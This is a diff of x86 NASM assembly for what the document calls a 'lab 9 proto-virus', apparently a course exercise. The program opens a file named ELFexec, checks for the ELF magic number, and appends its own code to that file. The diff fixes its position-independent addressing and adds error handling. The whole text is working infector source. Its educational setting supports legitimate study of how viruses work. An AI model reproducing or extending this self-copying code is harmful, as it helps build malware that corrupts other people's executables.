@@ -52,7 +52,7 @@
 %define ELFHDR_phoff	28
 
 %define FD dword [ebp - 4]
-%define ELF_header ebp - 56 ; Subbing 56 because -4 for pc increment and 52 for elf header size 
+%define ELFHDR ebp - 56 ; Subbing 56 because -4 for pc increment and 52 for elf header size 
 
 	global _start
 
@@ -62,15 +62,17 @@ _start:
 	mov	ebp, esp
 	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
 	;CODE START
-	call get_my_loc
-	add ebx, FileName			; Opening file in FileName
-	open ebx, RDWR, 0x777
+	open ecx, FileName, 0x777
+	cmp eax, 0
+	jl error
 	mov FD, eax
 
 	; Checking if file is an elf file
-	lea ecx, [ELF_header]		; Grabbing the effective address of elf header
-	read FD, ecx, ELFHDR_size
-	cmp dword [ELF_header], 0x464C457F
+	lea esi, [ELFHDR]		; Grabbing the effective address of elf header
+	read FD, esi, ELFHDR_size
+	cmp eax, 0
+	jl error
+	cmp dword [esi], 0x464C457F
 	jne not_elf
 
 	; file is an ELF file, so we'll infect it
@@ -78,40 +80,43 @@ _start:
 
 infect:
 	; first print Outstr to STDOUT
-	call get_my_loc
-	add ebx, OutStr
-	write 1, ebx, 32
+	write 1, OutStr, 32
 	
 	; Infect the file
 	lseek FD, 0, SEEK_END
 	call get_my_loc
-	add ebx, _start
+	sub ecx, next_i - _start
 	mov edx, virus_end - _start
-	write FD, ebx, edx
+	write FD, ecx, edx
 	close FD
+	cmp eax, 0
+	jl error
 	jmp VirusExit
 
 not_elf:
 	close FD
-	call get_my_loc
-	add ebx, Failstr
-	write 1, ebx, 12
+	cmp eax, 0
+	jl error
+	write 1, Failstr, 12
 	exit -1
 
 VirusExit:
        exit 0            ; Termination if all is OK and no previous code to jump to
                          ; (also an example for use of above macros)
-	
+error:
+	write 1, Error, 6
+	exit -1
+
+Error:		db "ERROR", 10, 0
 FileName:	db "ELFexec", 0 ; default was with 1 but you gave us the file without it
 OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
 Failstr:    db "perhaps not", 10 , 0
 
 
-get_my_loc:              ; puts location in ebx
+get_my_loc:
 	call next_i
 next_i:
-	pop ebx				; changed to ebx because this doesn't work with ecx 
-	sub ebx, next_i		; need to add sub because it doesn't subtract the address which screws things up
+	pop ecx
 	ret	
 PreviousEntryPoint: dd VirusExit
 virus_end:
